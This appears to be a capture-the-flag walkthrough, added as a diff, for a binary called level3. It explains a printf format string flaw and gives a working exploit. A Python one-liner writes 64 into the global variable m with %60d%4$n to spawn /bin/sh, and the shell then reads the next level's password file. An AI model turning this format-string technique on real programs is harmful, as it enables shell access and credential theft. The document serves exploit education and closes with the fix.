@@ -1,0 +1,53 @@
+**Level3 Walkthrough**
+
+**Overview**
+- **Summary**: A format string vulnerability in `level3` allows writing a controlled value into the global variable `m`, triggering a shell spawn.
+
+**Decompiled Source**
+- See [source](source.c) for the decompiled source.
+
+**Analysis**
+- The program reads input with `fgets()` into a 520-byte local buffer.
+- It then calls `printf()` using the user input directly as the format string.
+- This means `%n` in the input can write the number of bytes printed so far into an arbitrary address.
+- After `printf()`, the program checks `m`:
+
+```c
+if (m == 0x40) {
+    fwrite("Wait what?!\n", 1, 0xc, stdout);
+    system("/bin/sh");
+}
+```
+
+**Exploit**
+- The goal is to make `m == 0x40` by writing `64` into the global variable `m`.
+- In the binary, `m` is located at address `0x0804988c`.
+- The payload places that address first, then uses format padding and `%n`:
+
+```sh
+python -c 'print("\x8c\x98\x04\x08" + "%60d" + "%4$n")' > /tmp/payload
+(cat /tmp/payload; cat) | ./level3
+```
+
+**Reproduction**
+- Write the address of `m` in little-endian form at the start of the payload.
+- Use `%60d` to print enough characters so the total count is 64.
+- Use `%4$n` to write that count into the address on the stack.
+
+```text
+\x8c\x98\x04\x08%60d%4$n
+```
+
+**Result**
+- `m` becomes `0x40`.
+- The program prints `Wait what?!` and executes `/bin/sh`.
+- From the spawned shell, you can read the next level password:
+
+```sh
+whoami
+cat /home/user/level4/.pass
+```
+
+**Important point**
+- The vulnerability is `printf(local_20c)`, not `fgets()` itself.
+- A safe fix is to change it to `printf("%s", local_20c)`.
